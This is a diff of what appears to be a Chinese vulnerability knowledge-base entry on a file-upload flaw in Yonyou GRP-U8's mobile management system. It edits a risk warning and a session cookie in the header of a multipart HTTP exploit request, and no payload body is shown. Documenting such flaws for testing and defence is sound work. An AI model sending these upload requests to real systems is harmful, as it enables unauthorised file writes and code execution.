@@ -39,7 +39,7 @@ canonical: "Web安全/ERP企业/用友GRP-u8/用友 移动管理系统 uploadApk
 
 ## 操作风险
 
-文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -71,7 +71,7 @@ Host:
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.ser
+Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server
 Connection: close
 
 ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
